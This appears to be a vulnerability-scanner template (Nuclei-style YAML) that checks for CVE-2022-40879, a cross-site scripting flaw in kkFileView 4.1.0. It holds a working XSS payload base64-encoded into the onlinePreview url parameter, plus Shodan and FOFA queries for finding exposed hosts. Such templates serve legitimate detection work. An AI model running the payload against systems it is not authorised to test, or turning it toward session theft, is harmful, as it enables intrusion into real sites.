http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img src=1 onerror=alert(document.domain)>=PQ</p>
    - "\u8BE5\u6587\u4EF6\u4E0D"
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/onlinePreview?url=aHR0cHM6Ly93d3cuZ29vZ2xlLjxpbWcgc3JjPTEgb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPj1QUQ=='
id: CVE-2022-40879
info:
  author: arafatansari,co5mos
  classification:
    cpe: cpe:2.3:a:keking:kkfileview:4.1.0:*:*:*:*:*:*:*
    cve-id: CVE-2022-40879
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.95113
    epss-score: 0.19015
  description: 'kkFileView 4.1.0 contains multiple cross-site scripting vulnerabilities
    via the errorMsg parameter. An attacker can inject arbitrary script in the browser
    of an unsuspecting user in the context of the affected site. This can allow the
    attacker to steal cookie-based authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query:
    - body="kkfileview"
    - app="kkfileview"
    max-request: 1
    product: kkfileview
    shodan-query:
    - http.html:"kkFileView"
    - http.html:"kkfileview"
    vendor: keking
    verified: true
  name: kkFileView 4.1.0 - Cross-Site Scripting
  reference:
  - https://github.com/kekingcn/kkFileView/issues/389
  - https://nvd.nist.gov/vuln/detail/CVE-2022-40879
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/Henry4E36/POCS
  remediation: 'Upgrade to a patched version of kkFileView or apply the necessary
    security patches to mitigate the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2022,kkFileView,xss,keking,vuln
